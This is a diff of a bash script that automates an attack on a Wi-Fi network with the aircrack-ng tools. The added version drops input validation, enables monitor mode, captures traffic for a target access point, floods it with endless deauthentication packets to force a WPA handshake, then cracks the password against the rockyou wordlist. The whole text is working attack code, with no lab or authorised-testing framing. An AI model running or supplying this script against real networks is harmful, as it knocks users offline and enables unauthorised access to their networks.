@@ -1,51 +1,42 @@
 #!/bin/bash
 
-# Check if airodump-ng and aireplay-ng are installed
-if ! command -v airodump-ng &> /dev/null || ! command -v aireplay-ng &> /dev/null
-then
-    echo "airodump-ng or aireplay-ng is not installed. Please install them and try again."
-    exit 1
-fi
+# Prompt for MAC address
+read -p "Enter the target MAC Address: " MAC_ADDRESS
 
-# Prompt for the MAC address of the target AP
-read -p "Enter the MAC address of the target AP: " ap_mac
+# Prompt for Channel
+read -p "Enter the Channel: " CHANNEL
 
-# Validate MAC address format (basic check)
-if [[ ! $ap_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-    echo "Invalid MAC address format. Please use the format XX:XX:XX:XX:XX:XX."
-    exit 1
-fi
+# Prompt for Capture Filename
+read -p "Enter the filename for capture output: " CAPTURE_FILE
 
-# Prompt for the wireless interface in monitor mode
-read -p "Enter the wireless interface in monitor mode (e.g., wlan0mon): " interface
+echo "Starting monitor mode on wlan0..."
+sudo airmon-ng start wlan0
 
-# Prompt for the channel
-read -p "Enter the channel of the target AP: " channel
+echo "Running airodump-ng to capture packets on channel $CHANNEL..."
+sudo airodump-ng --bssid "$MAC_ADDRESS" --channel "$CHANNEL" -w "$CAPTURE_FILE" wlan0mon &
+AIRODUMP_PID=$!
 
-# Set output file for capturing handshake
-timestamp=$(date +"%Y%m%d_%H%M%S")
-output_file="handshake_$timestamp"
-
-echo "Starting airodump-ng to capture handshake..."
-
-# Run airodump-ng to capture handshake
-gnome-terminal -- airodump-ng --bssid "$ap_mac" --channel "$channel" --write "$output_file" "$interface"
-
-# Give airodump-ng a few seconds to initialize
+# Give airodump-ng some time to start capturing
 sleep 5
 
-# Ask for the target client's MAC address
-read -p "Enter the MAC address of a connected client (or press Enter to skip deauth): " client_mac
+echo "Starting deauthentication attack on $MAC_ADDRESS in a separate process..."
+sudo aireplay-ng --deauth 0 -a "$MAC_ADDRESS" wlan0mon &
 
-# If a client MAC address is provided, send deauthentication packets
-if [[ $client_mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-    echo "Sending deauthentication packets to client $client_mac..."
-    sudo aireplay-ng --deauth 10 -a "$ap_mac" -c "$client_mac" "$interface"
-else
-    echo "No client MAC provided. Skipping deauthentication step."
-fi
+# Monitor the capture file for handshake notification
+HANDSHAKE_CAPTURED=0
+while [ $HANDSHAKE_CAPTURED -eq 0 ]; do
+    if sudo grep -q "WPA handshake: $MAC_ADDRESS" "$CAPTURE_FILE"-01.csv; then
+        echo "Handshake captured for $MAC_ADDRESS!"
+        HANDSHAKE_CAPTURED=1
+        # Stop airodump-ng and aireplay-ng
+        sudo pkill -f "aireplay-ng --deauth"
+        sudo kill $AIRODUMP_PID
+    fi
+    sleep 5
+done
 
-echo "Handshake capture in progress. Use Ctrl+C in airodump-ng window to stop capture when done."
+echo "Stopping monitor mode on wlan0..."
+sudo airmon-ng stop wlan0mon
 
-# Indicate where the capture file will be saved
-echo "Handshake capture saved to ${output_file}-01.cap"
+echo "Attempting to crack the password using aircrack-ng..."
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt "$CAPTURE_FILE"-01.cap
